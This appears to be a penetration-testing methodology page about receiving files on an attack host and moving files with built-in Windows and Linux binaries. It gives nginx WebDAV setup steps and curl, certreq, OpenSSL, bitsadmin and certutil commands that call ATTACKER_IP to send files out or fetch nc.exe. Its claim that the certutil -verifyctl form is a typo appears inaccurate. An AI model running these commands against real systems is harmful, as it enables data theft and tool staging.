---
layout: page
title: "Catching Files and Living off the Land"
subtitle: "Receiving uploads with a WebDAV or TLS listener and using built-in Windows binaries to transfer files"
permalink: /methodology/shells-and-transfers/catching-files-lolbins/
---

**Purpose:** set up a receiver on the attack host that accepts files from the target, and use binaries already present on Windows (known as living-off-the-land binaries, or LOLBins) to move files when no additional tool can be placed on the host.

## Workflow

1. Decide which direction the file must travel. Use a receiver for exfiltration from the target, or a sender for download.
2. Stand up a receiver. Choose the one that matches the protocol the target can reach.
3. Use a built-in binary on the target to send or fetch the file.
4. Confirm the file arrived intact by hash.

## Building a WebDAV upload receiver with nginx

The notes recommend nginx over Apache for this receiver. The configuration below accepts only PUT requests on one path, which keeps the receiver narrow.

Create a directory for uploads and give ownership to the web-server user:

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Create `/etc/nginx/sites-available/upload.conf`:

```text
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

Enable the site, then test and reload the configuration:

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

The receiver can then accept a PUT from the target, for example with `curl -T FILE http://ATTACKER_IP:9001/SecretUploadDirectory/FILE`.

## Living-off-the-land uploads and downloads

### certreq (Windows upload)

`certreq.exe` can POST a local file to a listener, which makes it a practical exfiltration path where the host lacks other tools.

```powershell
certreq.exe -Post -config http://ATTACKER_IP:8000/ c:\windows\win.ini
```

Start a netcat listener on the attack host before running it.

### OpenSSL (Linux to Linux)

Generate a certificate on the attack host:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Serve a file over TLS:

```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Fetch it from the target:

```bash
openssl s_client -connect ATTACKER_IP:80 -quiet > LinEnum.sh
```

### BITSAdmin (Windows)

The Background Intelligent Transfer Service can download from HTTP sites and SMB shares:

```powershell
bitsadmin /transfer wcb /priority foreground http://ATTACKER_IP:8000/nc.exe C:\Users\USERNAME\Desktop\nc.exe
```

PowerShell can use the same service through the BITS transfer module:

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://ATTACKER_IP:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### certutil (Windows)

`certutil.exe` can fetch arbitrary files over HTTP and works as a generic download tool on Windows:

```powershell
certutil.exe -urlcache -split -f http://ATTACKER_IP:8000/nc.exe nc.exe
```

> The study note for this method lists `certutil.exe -verifyctl -split -f`. That switch is a typo. The download switch is `-urlcache`, and the command above is the form to use.
{: .info }

## What to look for

- Which Windows binaries are present and allowed to make outbound connections
- Whether the receiver's port is reachable from the target
- Whether the receiver directory's permissions limit writes to the upload path only

## Pitfalls

- LOLBins are logged and monitored by many endpoint tools. Expect certutil, bitsadmin and certreq to alert on some environments.
- A receiver that accepts arbitrary methods or paths is a risk on a shared host. Keep the nginx configuration narrow.
- The OpenSSL server flags above need to match the installed version. Confirm the flags with `openssl s_server -help` where in doubt.

## Defense and prevention

Restrict the use of certutil, bitsadmin and certreq with application control rules, and alert on their outbound network activity. Block unneeded outbound ports on servers and log binaries that connect to unfamiliar hosts.
